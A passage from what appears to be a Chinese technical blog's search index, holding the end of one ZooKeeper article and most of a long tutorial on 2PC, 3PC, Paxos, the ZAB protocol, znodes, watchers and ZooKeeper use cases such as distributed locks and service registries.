设计的崩溃可恢复的原子消息广播算法。\n5.1. ZAB 协议介绍    ZAB（ZooKeeper Atomic Broadcast 原子广播） 协议是为分布式协调服务 ZooKeeper 专门设计的一种支持崩溃恢复的原子广播协议。 在 ZooKeeper 中，主要依赖 ZAB 协议来实现分布式数据一致性，基于该协议，ZooKeeper 实现了一种主备模式的系统架构来保持集群中各个副本之间的数据一致性。\n5.2. ZAB 协议两种基本的模式：崩溃恢复和消息广播    ZAB 协议包括两种基本的模式，分别是\n 崩溃恢复 ：当整个服务框架在启动过程中，或是当 Leader 服务器出现网络中断、崩溃退出与重启等异常情况时，ZAB 协议就会进入恢复模式并选举产生新的 Leader 服务器。当选举产生了新的 Leader 服务器，同时集群中已经有过半的机器与该 Leader 服务器完成了状态同步之后，ZAB 协议就会退出恢复模式。其中，所谓的状态同步是指数据同步，用来保证集群中存在过半的机器能够和 Leader 服务器的数据状态保持一致。 消息广播 ：当集群中已经有过半的 Follower 服务器完成了和 Leader 服务器的状态同步，那么整个服务框架就可以进入消息广播模式了。 当一台同样遵守 ZAB 协议的服务器启动后加入到集群中时，如果此时集群中已经存在一个 Leader 服务器在负责进行消息广播，那么新加入的服务器就会自觉地进入数据恢复模式：找到 Leader 所在的服务器，并与其进行数据同步，然后一起参与到消息广播流程中去。  关于 ZAB 协议\u0026amp;Paxos 算法 需要讲和理解的东西太多了，具体可以看下面这两篇文章：\n 图解 Paxos 一致性协议 Zookeeper ZAB 协议分析  6. 总结     ZooKeeper 本身就是一个分布式程序（只要半数以上节点存活，ZooKeeper 就能正常服务）。 为了保证高可用，最好是以集群形态来部署 ZooKeeper，这样只要集群中大部分机器是可用的（能够容忍一定的机器故障），那么 ZooKeeper 本身仍然是可用的。 ZooKeeper 将数据保存在内存中，这也就保证了 高吞吐量和低延迟（但是内存限制了能够存储的容量不太大，此限制也是保持 znode 中存储的数据量较小的进一步原因）。 ZooKeeper 是高性能的。 在“读”多于“写”的应用程序中尤其地明显，因为“写”会导致所有的服务器间同步状态。（“读”多于“写”是协调服务的典型场景。） ZooKeeper 有临时节点的概念。 当创建临时节点的客户端会话一直保持活动，瞬时节点就一直存在。而当会话终结时，瞬时节点被删除。持久节点是指一旦这个 znode 被创建了，除非主动进行 znode 的移除操作，否则这个 znode 将一直保存在 ZooKeeper 上。 ZooKeeper 底层其实只提供了两个功能：① 管理（存储、读取）用户程序提交的数据；② 为用户程序提供数据节点监听服务。  7. 参考     《从 Paxos 到 ZooKeeper 分布式一致性原理与实践》  "},{"id":319,"href":"/system-design/distributed-system/zookeeper/zookeeper-plus/","title":"zookeeper-plus","parent":"zookeeper","content":"FrancisQ 投稿。\n 1. 好久不见 2. 什么是ZooKeeper 3. 一致性问题 4. 一致性协议和算法  4.1. 2PC（两阶段提交） 4.2. 3PC（三阶段提交） 4.3. Paxos 算法  4.3.1. prepare 阶段 4.3.2. accept 阶段 4.3.3. paxos 算法的死循环问题     5. 引出 ZAB  5.1. Zookeeper 架构 5.2. ZAB 中的三个角色 5.3. 消息广播模式 5.4. 崩溃恢复模式   6. Zookeeper的几个理论知识  6.1. 数据模型 6.2. 会话 6.3. ACL 6.4. Watcher机制   7. Zookeeper的几个典型应用场景  7.1. 选主 7.2. 分布式锁 7.3. 命名服务 7.4. 集群管理和注册中心   8. 总结  1. 好久不见    离上一篇文章的发布也快一个月了，想想已经快一个月没写东西了，其中可能有期末考试、课程设计和驾照考试，但这都不是借口！\n一到冬天就懒的不行，望广大掘友督促我🙄🙄✍️✍️。\n 文章很长，先赞后看，养成习惯。❤️ 🧡 💛 💚 💙 💜\n 2. 什么是ZooKeeper    ZooKeeper 由 Yahoo 开发，后来捐赠给了 Apache ，现已成为 Apache 顶级项目。ZooKeeper 是一个开源的分布式应用程序协调服务器，其为分布式系统提供一致性服务。其一致性是通过基于 Paxos 算法的 ZAB 协议完成的。其主要功能包括：配置维护、分布式同步、集群管理、分布式事务等。\n简单来说， ZooKeeper 是一个 分布式协调服务框架 。分布式？协调服务？这啥玩意？🤔🤔\n其实解释到分布式这个概念的时候，我发现有些同学并不是能把 **分布式和集群 **这两个概念很好的理解透。前段时间有同学和我探讨起分布式的东西，他说分布式不就是加机器吗？一台机器不够用再加一台抗压呗。当然加机器这种说法也无可厚非，你一个分布式系统必定涉及到多个机器，但是你别忘了，计算机学科中还有一个相似的概念—— Cluster ，集群不也是加机器吗？但是 集群 和 分布式 其实就是两个完全不同的概念。\n比如，我现在有一个秒杀服务，并发量太大单机系统承受不住，那我加几台服务器也 一样 提供秒杀服务，这个时候就是 Cluster 集群 。\n但是，我现在换一种方式，我将一个秒杀服务 拆分成多个子服务 ，比如创建订单服务，增加积分服务，扣优惠券服务等等，然后我将这些子服务都部署在不同的服务器上 ，这个时候就是 Distributed 分布式 。\n而我为什么反驳同学所说的分布式就是加机器呢？因为我认为加机器更加适用于构建集群，因为它真是只有加机器。而对于分布式来说，你首先需要将业务进行拆分，然后再加机器（不仅仅是加机器那么简单），同时你还要去解决分布式带来的一系列问题。\n比如各个分布式组件如何协调起来，如何减少各个系统之间的耦合度，分布式事务的处理，如何去配置整个分布式系统等等。ZooKeeper 主要就是解决这些问题的。\n3. 一致性问题    设计一个分布式系统必定会遇到一个问题—— 因为分区容忍性（partition tolerance）的存在，就必定要求我们需要在系统可用性（availability）和数据一致性（consistency）中做出权衡 。这就是著名的 CAP 定理。\n理解起来其实很简单，比如说把一个班级作为整个系统，而学生是系统中的一个个独立的子系统。这个时候班里的小红小明偷偷谈恋爱被班里的大嘴巴小花发现了，小花欣喜若狂告诉了周围的人，然后小红小明谈恋爱的消息在班级里传播起来了。当在消息的传播（散布）过程中，你抓到一个同学问他们的情况，如果回答你不知道，那么说明整个班级系统出现了数据不一致的问题（因为小花已经知道这个消息了）。而如果他直接不回答你，因为整个班级有消息在进行传播（为了保证一致性，需要所有人都知道才可提供服务），这个时候就出现了系统的可用性问题。\n而上述前者就是 Eureka 的处理方式，它保证了AP（可用性），后者就是我们今天所要讲的 ZooKeeper 的处理方式，它保证了CP（数据一致性）。\n4. 一致性协议和算法    而为了解决数据一致性问题，在科学家和程序员的不断探索中，就出现了很多的一致性协议和算法。比如 2PC（两阶段提交），3PC（三阶段提交），Paxos算法等等。\n这时候请你思考一个问题，同学之间如果采用传纸条的方式去传播消息，那么就会出现一个问题——我咋知道我的小纸条有没有传到我想要传递的那个人手中呢？万一被哪个小家伙给劫持篡改了呢，对吧？\n这个时候就引申出一个概念—— 拜占庭将军问题 。它意指 在不可靠信道上试图通过消息传递的方式达到一致性是不可能的， 所以所有的一致性算法的 必要前提 就是安全可靠的消息通道。\n而为什么要去解决数据一致性的问题？你想想，如果一个秒杀系统将服务拆分成了下订单和加积分服务，这两个服务部署在不同的机器上了，万一在消息的传播过程中积分系统宕机了，总不能你这边下了订单却没加积分吧？你总得保证两边的数据需要一致吧？\n4.1. 2PC（两阶段提交）    两阶段提交是一种保证分布式系统数据一致性的协议，现在很多数据库都是采用的两阶段提交协议来完成 分布式事务 的处理。\n在介绍2PC之前，我们先来想想分布式事务到底有什么问题呢？\n还拿秒杀系统的下订单和加积分两个系统来举例吧（我想你们可能都吐了🤮🤮🤮），我们此时下完订单会发个消息给积分系统告诉它下面该增加积分了。如果我们仅仅是发送一个消息也不收回复，那么我们的订单系统怎么能知道积分系统的收到消息的情况呢？如果我们增加一个收回复的过程，那么当积分系统收到消息后返回给订单系统一个 Response ，但在中间出现了网络波动，那个回复消息没有发送成功，订单系统是不是以为积分系统消息接收失败了？它是不是会回滚事务？但此时积分系统是成功收到消息的，它就会去处理消息然后给用户增加积分，这个时候就会出现积分加了但是订单没下成功。\n所以我们所需要解决的是在分布式系统中，整个调用链中，我们所有服务的数据处理要么都成功要么都失败，即所有服务的 原子性问题 。\n在两阶段提交中，主要涉及到两个角色，分别是协调者和参与者。\n第一阶段：当要执行一个分布式事务的时候，事务发起者首先向协调者发起事务请求，然后协调者会给所有参与者发送 prepare 请求（其中包括事务内容）告诉参与者你们需要执行事务了，如果能执行我发的事务内容那么就先执行但不提交，执行后请给我回复。然后参与者收到 prepare 消息后，他们会开始执行事务（但不提交），并将 Undo 和 Redo 信息记入事务日志中，之后参与者就向协调者反馈是否准备好了。\n第二阶段：第二阶段主要是协调者根据参与者反馈的情况来决定接下来是否可以进行事务的提交操作，即提交事务或者回滚事务。\n比如这个时候 所有的参与者 都返回了准备好了的消息，这个时候就进行事务的提交，协调者此时会给所有的参与者发送 Commit 请求 ，当参与者收到 Commit 请求的时候会执行前面执行的事务的 提交操作 ，提交完毕之后将给协调者发送提交成功的响应。\n而如果在第一阶段并不是所有参与者都返回了准备好了的消息，那么此时协调者将会给所有参与者发送 回滚事务的 rollback 请求，参与者收到之后将会 回滚它在第一阶段所做的事务处理 ，然后再将处理情况返回给协调者，最终协调者收到响应后便给事务发起者返回处理失败的结果。\n个人觉得 2PC 实现得还是比较鸡肋的，因为事实上它只解决了各个事务的原子性问题，随之也带来了很多的问题。\n 单点故障问题，如果协调者挂了那么整个系统都处于不可用的状态了。 阻塞问题，即当协调者发送 prepare 请求，参与者收到之后如果能处理那么它将会进行事务的处理但并不提交，这个时候会一直占用着资源不释放，如果此时协调者挂了，那么这些资源都不会再释放了，这会极大影响性能。 数据不一致问题，比如当第二阶段，协调者只发送了一部分的 commit 请求就挂了，那么也就意味着，收到消息的参与者会进行事务的提交，而后面没收到的则不会进行事务提交，那么这时候就会产生数据不一致性问题。  4.2. 3PC（三阶段提交）    因为2PC存在的一系列问题，比如单点，容错机制缺陷等等，从而产生了 3PC（三阶段提交） 。那么这三阶段又分别是什么呢？\n 千万不要吧PC理解成个人电脑了，其实他们是 phase-commit 的缩写，即阶段提交。\n  CanCommit阶段：协调者向所有参与者发送 CanCommit 请求，参与者收到请求后会根据自身情况查看是否能执行事务，如果可以则返回 YES 响应并进入预备状态，否则返回 NO 。 PreCommit阶段：协调者根据参与者返回的响应来决定是否可以进行下面的 PreCommit 操作。如果上面参与者返回的都是 YES，那么协调者将向所有参与者发送 PreCommit 预提交请求，参与者收到预提交请求后，会进行事务的执行操作，并将 Undo 和 Redo 信息写入事务日志中 ，最后如果参与者顺利执行了事务则给协调者返回成功的响应。如果在第一阶段协调者收到了 任何一个 NO 的信息，或者 在一定时间内 并没有收到全部的参与者的响应，那么就会中断事务，它会向所有参与者发送中断请求（abort），参与者收到中断请求之后会立即中断事务，或者在一定时间内没有收到协调者的请求，它也会中断事务。 DoCommit阶段：这个阶段其实和 2PC 的第二阶段差不多，如果协调者收到了所有参与者在 PreCommit 阶段的 YES 响应，那么协调者将会给所有参与者发送 DoCommit 请求，参与者收到 DoCommit 请求后则会进行事务的提交工作，完成后则会给协调者返回响应，协调者收到所有参与者返回的事务提交成功的响应之后则完成事务。若协调者在 PreCommit 阶段 收到了任何一个 NO 或者在一定时间内没有收到所有参与者的响应 ，那么就会进行中断请求的发送，参与者收到中断请求后则会 通过上面记录的回滚日志 来进行事务的回滚操作，并向协调者反馈回滚状况，协调者收到参与者返回的消息后，中断事务。   这里是 3PC 在成功的环境下的流程图，你可以看到 3PC 在很多地方进行了超时中断的处理，比如协调者在指定时间内为收到全部的确认消息则进行事务中断的处理，这样能 减少同步阻塞的时间 。还有需要注意的是，3PC 在 DoCommit 阶段参与者如未收到协调者发送的提交事务的请求，它会在一定时间内进行事务的提交。为什么这么做呢？是因为这个时候我们肯定保证了在第一阶段所有的协调者全部返回了可以执行事务的响应，这个时候我们有理由相信其他系统都能进行事务的执行和提交，所以不管协调者有没有发消息给参与者，进入第三阶段参与者都会进行事务的提交操作。\n 总之，3PC 通过一系列的超时机制很好的缓解了阻塞问题，但是最重要的一致性并没有得到根本的解决，比如在 PreCommit 阶段，当一个参与者收到了请求之后其他参与者和协调者挂了或者出现了网络分区，这个时候收到消息的参与者都会进行事务提交，这就会出现数据不一致性问题。\n所以，要解决一致性问题还需要靠 Paxos 算法⭐️ ⭐️ ⭐️ 。\n4.3. Paxos 算法    Paxos 算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一，其解决的问题就是在分布式系统中如何就某个值（决议）达成一致 。\n在 Paxos 中主要有三个角色，分别为 Proposer提案者、Acceptor表决者、Learner学习者。Paxos 算法和 2PC 一样，也有两个阶段，分别为 Prepare 和 accept 阶段。\n4.3.1. prepare 阶段     Proposer提案者：负责提出 proposal，每个提案者在提出提案时都会首先获取到一个 具有全局唯一性的、递增的提案编号N，即在整个集群中是唯一的编号 N，然后将该编号赋予其要提出的提案，在第一阶段是只将提案编号发送给所有的表决者。 Acceptor表决者：每个表决者在 accept 某提案后，会将该提案编号N记录在本地，这样每个表决者中保存的已经被 accept 的提案中会存在一个编号最大的提案，其编号假设为 maxN。每个表决者仅会 accept 编号大于自己本地 maxN 的提案，在批准提案时表决者会将以前接受过的最大编号的提案作为响应反馈给 Proposer 。   下面是 prepare 阶段的流程图，你可以对照着参考一下。\n 4.3.2. accept 阶段    当一个提案被 Proposer 提出后，如果 Proposer 收到了超过半数的 Acceptor 的批准（Proposer 本身同意），那么此时 Proposer 会给所有的 Acceptor 发送真正的提案（你可以理解为第一阶段为试探），这个时候 Proposer 就会发送提案的内容和提案编号。\n表决者收到提案请求后会再次比较本身已经批准过的最大提案编号和该提案编号，如果该提案编号 大于等于 已经批准过的最大提案编号，那么就 accept 该提案（此时执行提案内容但不提交），随后将情况返回给 Proposer 。如果不满足则不回应或者返回 NO 。\n当 Proposer 收到超过半数的 accept ，那么它这个时候会向所有的 acceptor 发送提案的提交请求。需要注意的是，因为上述仅仅是超过半数的 acceptor 批准执行了该提案内容，其他没有批准的并没有执行该提案内容，所以这个时候需要向未批准的 acceptor 发送提案内容和提案编号并让它无条件执行和提交，而对于前面已经批准过该提案的 acceptor 来说 仅仅需要发送该提案的编号 ，让 acceptor 执行提交就行了。\n而如果 Proposer 如果没有收到超过半数的 accept 那么它将会将 递增 该 Proposal 的编号，然后 重新进入 Prepare 阶段 。\n 对于 Learner 来说如何去学习 Acceptor 批准的提案内容，这有很多方式，读者可以自己去了解一下，这里不做过多解释。\n 4.3.3. paxos 算法的死循环问题    其实就有点类似于两个人吵架，小明说我是对的，小红说我才是对的，两个人据理力争的谁也不让谁🤬🤬。\n比如说，此时提案者 P1 提出一个方案 M1，完成了 Prepare 阶段的工作，这个时候 acceptor 则批准了 M1，但是此时提案者 P2 同时也提出了一个方案 M2，它也完成了 Prepare 阶段的工作。然后 P1 的方案已经不能在第二阶段被批准了（因为 acceptor 已经批准了比 M1 更大的 M2），所以 P1 自增方案变为 M3 重新进入 Prepare 阶段，然后 acceptor ，又批准了新的 M3 方案，它又不能批准 M2 了，这个时候 M2 又自增进入 Prepare 阶段。。。\n就这样无休无止的永远提案下去，这就是 paxos 算法的死循环问题。\n那么如何解决呢？很简单，人多了容易吵架，我现在 就允许一个能提案 就行了。\n5. 引出 ZAB    5.1. Zookeeper 架构    作为一个优秀高效且可靠的分布式协调框架，ZooKeeper 在解决分布式数据一致性问题时并没有直接使用 Paxos ，而是专门定制了一致性协议叫做 ZAB(ZooKeeper Atomic Broadcast) 原子广播协议，该协议能够很好地支持 崩溃恢复 。\n5.2. ZAB 中的三个角色    和介绍 Paxos 一样，在介绍 ZAB 协议之前，我们首先来了解一下在 ZAB 中三个主要的角色，Leader 领导者、Follower跟随者、Observer观察者 。\n Leader ：集群中 唯一的写请求处理者 ，能够发起投票（投票也是为了进行写请求）。 Follower：能够接收客户端的请求，如果是读请求则可以自己处理，如果是写请求则要转发给 Leader 。在选举过程中会参与投票，有选举权和被选举权 。 Observer ：就是没有选举权和被选举权的 Follower 。  在 ZAB 协议中对 zkServer(即上面我们说的三个角色的总称) 还有两种模式的定义，分别是 消息广播 和 崩溃恢复 。\n5.3. 消息广播模式    说白了就是 ZAB 协议是如何处理写请求的，上面我们不是说只有 Leader 能处理写请求嘛？那么我们的 Follower 和 Observer 是不是也需要 同步更新数据 呢？总不能数据只在 Leader 中更新了，其他角色都没有得到更新吧？\n不就是 在整个集群中保持数据的一致性 嘛？如果是你，你会怎么做呢？\n废话，第一步肯定需要 Leader 将写请求 广播 出去呀，让 Leader 问问 Followers 是否同意更新，如果超过半数以上的同意那么就进行 Follower 和 Observer 的更新（和 Paxos 一样）。当然这么说有点虚，画张图理解一下。\n嗯。。。看起来很简单，貌似懂了🤥🤥🤥。这两个 Queue 哪冒出来的？答案是 ZAB 需要让 Follower 和 Observer 保证顺序性 。何为顺序性，比如我现在有一个写请求A，此时 Leader 将请求A广播出去，因为只需要半数同意就行，所以可能这个时候有一个 Follower F1因为网络原因没有收到，而 Leader 又广播了一个请求B，因为网络原因，F1竟然先收到了请求B然后才收到了请求A，这个时候请求处理的顺序不同就会导致数据的不同，从而 产生数据不一致问题 。\n所以在 Leader 这端，它为每个其他的 zkServer 准备了一个 队列 ，采用先进先出的方式发送消息。由于协议是 **通过 TCP **来进行网络通信的，保证了消息的发送顺序性，接受顺序性也得到了保证。\n除此之外，在 ZAB 中还定义了一个 全局单调递增的事务ID ZXID ，它是一个64位long型，其中高32位表示 epoch 年代，低32位表示事务id。epoch 是会根据 Leader 的变化而变化的，当一个 Leader 挂了，新的 Leader 上位的时候，年代（epoch）就变了。而低32位可以简单理解为递增的事务id。\n定义这个的原因也是为了顺序性，每个 proposal 在 Leader 中生成后需要 通过其 ZXID 来进行排序 ，才能得到处理。\n5.4. 崩溃恢复模式    说到崩溃恢复我们首先要提到 ZAB 中的 Leader 选举算法，当系统出现崩溃影响最大应该是 Leader 的崩溃，因为我们只有一个 Leader ，所以当 Leader 出现问题的时候我们势必需要重新选举 Leader 。\nLeader 选举可以分为两个不同的阶段，第一个是我们提到的 Leader 宕机需要重新选举，第二则是当 Zookeeper 启动时需要进行系统的 Leader 初始化选举。下面我先来介绍一下 ZAB 是如何进行初始化选举的。\n假设我们集群中有3台机器，那也就意味着我们需要两台以上同意（超过半数）。比如这个时候我们启动了 server1 ，它会首先 投票给自己 ，投票内容为服务器的 myid 和 ZXID ，因为初始化所以 ZXID 都为0，此时 server1 发出的投票为 (1,0)。但此时 server1 的投票仅为1，所以不能作为 Leader ，此时还在选举阶段所以整个集群处于 Looking 状态。\n接着 server2 启动了，它首先也会将投票选给自己(2,0)，并将投票信息广播出去（server1也会，只是它那时没有其他的服务器了），server1 在收到 server2 的投票信息后会将投票信息与自己的作比较。首先它会比较 ZXID ，ZXID 大的优先为 Leader，如果相同则比较 myid，myid 大的优先作为 Leader。所以此时server1 发现 server2 更适合做 Leader，它就会将自己的投票信息更改为(2,0)然后再广播出去，之后server2 收到之后发现和自己的一样无需做更改，并且自己的 投票已经超过半数 ，则 确定 server2 为 Leader，server1 也会将自己服务器设置为 Following 变为 Follower。整个服务器就从 Looking 变为了正常状态。\n当 server3 启动发现集群没有处于 Looking 状态时，它会直接以 Follower 的身份加入集群。\n还是前面三个 server 的例子，如果在整个集群运行的过程中 server2 挂了，那么整个集群会如何重新选举 Leader 呢？其实和初始化选举差不多。\n首先毫无疑问的是剩下的两个 Follower 会将自己的状态 从 Following 变为 Looking 状态 ，然后每个 server 会向初始化投票一样首先给自己投票（这不过这里的 zxid 可能不是0了，这里为了方便随便取个数字）。\n假设 server1 给自己投票为(1,99)，然后广播给其他 server，server3 首先也会给自己投票(3,95)，然后也广播给其他 server。server1 和 server3 此时会收到彼此的投票信息，和一开始选举一样，他们也会比较自己的投票和收到的投票（zxid 大的优先，如果相同那么就 myid 大的优先）。这个时候 server1 收到了 server3 的投票发现没自己的合适故不变，server3 收到 server1 的投票结果后发现比自己的合适于是更改投票为(1,99)然后广播出去，最后 server1 收到了发现自己的投票已经超过半数就把自己设为 Leader，server3 也随之变为 Follower。\n 请注意 ZooKeeper 为什么要设置奇数个结点？比如这里我们是三个，挂了一个我们还能正常工作，挂了两个我们就不能正常工作了（已经没有超过半数的节点数了，所以无法进行投票等操作了）。而假设我们现在有四个，挂了一个也能工作，但是挂了两个也不能正常工作了，这是和三个一样的，而三个比四个还少一个，带来的效益是一样的，所以 Zookeeper 推荐奇数个 server 。\n 那么说完了 ZAB 中的 Leader 选举方式之后我们再来了解一下 崩溃恢复 是什么玩意？\n其实主要就是 当集群中有机器挂了，我们整个集群如何保证数据一致性？\n如果只是 Follower 挂了，而且挂的没超过半数的时候，因为我们一开始讲了在 Leader 中会维护队列，所以不用担心后面的数据没接收到导致数据不一致性。\n如果 Leader 挂了那就麻烦了，我们肯定需要先暂停服务变为 Looking 状态然后进行 Leader 的重新选举（上面我讲过了），但这个就要分为两种情况了，分别是 确保已经被Leader提交的提案最终能够被所有的Follower提交 和 跳过那些已经被丢弃的提案 。\n确保已经被Leader提交的提案最终能够被所有的Follower提交是什么意思呢？\n假设 Leader (server2) 发送 commit 请求（忘了请看上面的消息广播模式），他发送给了 server3，然后要发给 server1 的时候突然挂了。这个时候重新选举的时候我们如果把 server1 作为 Leader 的话，那么肯定会产生数据不一致性，因为 server3 肯定会提交刚刚 server2 发送的 commit 请求的提案，而 server1 根本没收到所以会丢弃。\n那怎么解决呢？\n聪明的同学肯定会质疑，这个时候 server1 已经不可能成为 Leader 了，因为 server1 和 server3 进行投票选举的时候会比较 ZXID ，而此时 server3 的 ZXID 肯定比 server1 的大了。(不理解可以看前面的选举算法)\n那么跳过那些已经被丢弃的提案又是什么意思呢？\n假设 Leader (server2) 此时同意了提案N1，自身提交了这个事务并且要发送给所有 Follower 要 commit 的请求，却在这个时候挂了，此时肯定要重新进行 Leader 的选举，比如说此时选 server1 为 Leader （这无所谓）。但是过了一会，这个 挂掉的 Leader 又重新恢复了 ，此时它肯定会作为 Follower 的身份进入集群中，需要注意的是刚刚 server2 已经同意提交了提案N1，但其他 server 并没有收到它的 commit 信息，所以其他 server 不可能再提交这个提案N1了，这样就会出现数据不一致性问题了，所以 该提案N1最终需要被抛弃掉 。\n6. Zookeeper的几个理论知识    了解了 ZAB 协议还不够，它仅仅是 Zookeeper 内部实现的一种方式，而我们如何通过 Zookeeper 去做一些典型的应用场景呢？比如说集群管理，分布式锁，Master 选举等等。\n这就涉及到如何使用 Zookeeper 了，但在使用之前我们还需要掌握几个概念。比如 Zookeeper 的 数据模型 、会话机制、ACL、Watcher机制 等等。\n6.1. 数据模型    zookeeper 数据存储结构与标准的 Unix 文件系统非常相似，都是在根节点下挂很多子节点(树型)。但是 zookeeper 中没有文件系统中目录与文件的概念，而是 使用了 znode 作为数据节点 。znode 是 zookeeper 中的最小数据单元，每个 znode 上都可以保存数据，同时还可以挂载子节点，形成一个树形化命名空间。\n每个 znode 都有自己所属的 节点类型 和 节点状态。\n其中节点类型可以分为 持久节点、持久顺序节点、临时节点 和 临时顺序节点。\n 持久节点：一旦创建就一直存在，直到将其删除。 持久顺序节点：一个父节点可以为其子节点 维护一个创建的先后顺序 ，这个顺序体现在 节点名称 上，是节点名称后自动添加一个由 10 位数字组成的数字串，从 0 开始计数。 临时节点：临时节点的生命周期是与 客户端会话 绑定的，会话消失则节点消失 。临时节点 只能做叶子节点 ，不能创建子节点。 临时顺序节点：父节点可以创建一个维持了顺序的临时节点(和前面的持久顺序性节点一样)。  节点状态中包含了很多节点的属性比如 czxid 、mzxid 等等，在 zookeeper 中是使用 Stat 这个类来维护的。下面我列举一些属性解释。\n czxid：Created ZXID，该数据节点被 创建 时的事务ID。 mzxid：Modified ZXID，节点 最后一次被更新时 的事务ID。 ctime：Created Time，该节点被创建的时间。 mtime： Modified Time，该节点最后一次被修改的时间。 version：节点的版本号。 cversion：子节点 的版本号。 aversion：节点的 ACL 版本号。 ephemeralOwner：创建该节点的会话的 sessionID ，如果该节点为持久节点，该值为0。 dataLength：节点数据内容的长度。 numChildre：该节点的子节点个数，如果为临时节点为0。 pzxid：该节点子节点列表最后一次被修改时的事务ID，注意是子节点的 列表 ，不是内容。  6.2. 会话    我想这个对于后端开发的朋友肯定不陌生，不就是 session 吗？只不过 zk 客户端和服务端是通过 TCP 长连接 维持的会话机制，其实对于会话来说你可以理解为 保持连接状态 。\n在 zookeeper 中，会话还有对应的事件，比如 CONNECTION_LOSS 连接丢失事件 、SESSION_MOVED 会话转移事件 、SESSION_EXPIRED 会话超时失效事件 。\n6.3. ACL    ACL 为 Access Control Lists ，它是一种权限控制。在 zookeeper 中定义了5种权限，它们分别为：\n CREATE ：创建子节点的权限。 READ：获取节点数据和子节点列表的权限。 WRITE：更新节点数据的权限。 DELETE：删除子节点的权限。 ADMIN：设置节点 ACL 的权限。  6.4. Watcher机制    Watcher 为事件监听器，是 zk 非常重要的一个特性，很多功能都依赖于它，它有点类似于订阅的方式，即客户端向服务端 注册 指定的 watcher ，当服务端符合了 watcher 的某些事件或要求则会 向客户端发送事件通知 ，客户端收到通知后找到自己定义的 Watcher 然后 执行相应的回调方法 。\n7. Zookeeper的几个典型应用场景    前面说了这么多的理论知识，你可能听得一头雾水，这些玩意有啥用？能干啥事？别急，听我慢慢道来。\n7.1. 选主    还记得上面我们的所说的临时节点吗？因为 Zookeeper 的强一致性，能够很好地在保证 在高并发的情况下保证节点创建的全局唯一性 (即无法重复创建同样的节点)。\n利用这个特性，我们可以 让多个客户端创建一个指定的节点 ，创建成功的就是 master。\n但是，如果这个 master 挂了怎么办？？？\n你想想为什么我们要创建临时节点？还记得临时节点的生命周期吗？master 挂了是不是代表会话断了？会话断了是不是意味着这个节点没了？还记得 watcher 吗？我们是不是可以 让其他不是 master 的节点监听节点的状态 ，比如说我们监听这个临时节点的父节点，如果子节点个数变了就代表 master 挂了，这个时候我们 触发回调函数进行重新选举 ，或者我们直接监听节点的状态，我们可以通过节点是否已经失去连接来判断 master 是否挂了等等。\n总的来说，我们可以完全 利用 临时节点、节点状态 和 watcher 来实现选主的功能，临时节点主要用来选举，节点状态和watcher 可以用来判断 master 的活性和进行重新选举。\n7.2. 分布式锁    分布式锁的实现方式有很多种，比如 Redis 、数据库 、zookeeper 等。个人认为 zookeeper 在实现分布式锁这方面是非常非常简单的。\n上面我们已经提到过了 zk在高并发的情况下保证节点创建的全局唯一性，这玩意一看就知道能干啥了。实现互斥锁呗，又因为能在分布式的情况下，所以能实现分布式锁呗。\n如何实现呢？这玩意其实跟选主基本一样，我们也可以利用临时节点的创建来实现。\n首先肯定是如何获取锁，因为创建节点的唯一性，我们可以让多个客户端同时创建一个临时节点，创建成功的就说明获取到了锁 。然后没有获取到锁的客户端也像上面选主的非主节点创建一个 watcher 进行节点状态的监听，如果这个互斥锁被释放了（可能获取锁的客户端宕机了，或者那个客户端主动释放了锁）可以调用回调函数重新获得锁。\n zk 中不需要向 redis 那样考虑锁得不到释放的问题了，因为当客户端挂了，节点也挂了，锁也释放了。是不是很简答？\n 那能不能使用 zookeeper 同时实现 共享锁和独占锁 呢？答案是可以的，不过稍微有点复杂而已。\n还记得 有序的节点 吗？\n这个时候我规定所有创建节点必须有序，当你是读请求（要获取共享锁）的话，如果 没有比自己更小的节点，或比自己小的节点都是读请求 ，则可以获取到读锁，然后就可以开始读了。若比自己小的节点中有写请求 ，则当前客户端无法获取到读锁，只能等待前面的写请求完成。\n如果你是写请求（获取独占锁），若 没有比自己更小的节点 ，则表示当前客户端可以直接获取到写锁，对数据进行修改。若发现 有比自己更小的节点，无论是读操作还是写操作，当前客户端都无法获取到写锁 ，等待所有前面的操作完成。\n这就很好地同时实现了共享锁和独占锁，当然还有优化的地方，比如当一个锁得到释放它会通知所有等待的客户端从而造成 羊群效应 。此时你可以通过让等待的节点只监听他们前面的节点。\n具体怎么做呢？其实也很简单，你可以让 读请求监听比自己小的最后一个写请求节点，写请求只监听比自己小的最后一个节点 ，感兴趣的小伙伴可以自己去研究一下。\n7.3. 命名服务    如何给一个对象设置ID，大家可能都会想到 UUID，但是 UUID 最大的问题就在于它太长了。。。(太长不一定是好事，嘿嘿嘿)。那么在条件允许的情况下，我们能不能使用 zookeeper 来实现呢？\n我们之前提到过 zookeeper 是通过 树形结构 来存储数据节点的，那也就是说，对于每个节点的 全路径，它必定是唯一的，我们可以使用节点的全路径作为命名方式了。而且更重要的是，路径是我们可以自己定义的，这对于我们对有些有语意的对象的ID设置可以更加便于理解。\n7.4. 集群管理和注册中心    看到这里是不是觉得 zookeeper 实在是太强大了，它怎么能这么能干！\n别急，它能干的事情还很多呢。可能我们会有这样的需求，我们需要了解整个集群中有多少机器在工作，我们想对集群中的每台机器的运行时状态进行数据采集，对集群中机器进行上下线操作等等。\n而 zookeeper 天然支持的 watcher 和 临时节点能很好的实现这些需求。我们可以为每条机器创建临时节点，并监控其父节点，如果子节点列表有变动（我们可能创建删除了临时节点），那么我们可以使用在其父节点绑定的 watcher 进行状态监控和回调。\n至于注册中心也很简单，我们同样也是让 服务提供者 在 zookeeper 中创建一个临时节点并且将自己的 ip、port、调用方式 写入节点，当 服务消费者 需要进行调用的时候会 通过注册中心找到相应的服务的地址列表(IP端口什么的) ，并缓存到本地(方便以后调用)，当消费者调用服务时，不会再去请求注册中心，而是直接通过负载均衡算法从地址列表中取一个服务提供者的服务器调用服务。\n当服务提供者的某台服务器宕机或下线时，相应的地址会从服务提供者地址列表中移除。同时，注册中心会将新的服务地址列表发送给服务消费者的机器并缓存在消费者本机（当然你可以让消费者进行节点监听，我记得 Eureka 会先试错，然后再更新）。\n8. 总结    看到这里的同学实在是太有耐心了👍👍👍，如果觉得我写得不错的话点个赞哈。\n不知道大家是否还记得我讲了什么😒。\n这篇文章中我带大家入门了 zookeeper 这个强大的分布式协调框架。现在我们来简单梳理一下整篇文章的内容。\n  分布式与集群的区别\n  2PC 、3PC 以及 paxos 算法这些一致性框架的原理和实现。\n  zookeeper 专门的一致性算法 ZAB 原子广播协议的内容（Leader 选举、崩溃恢复、消息广播）。\n  zookeeper 中的一些基本概念，比如 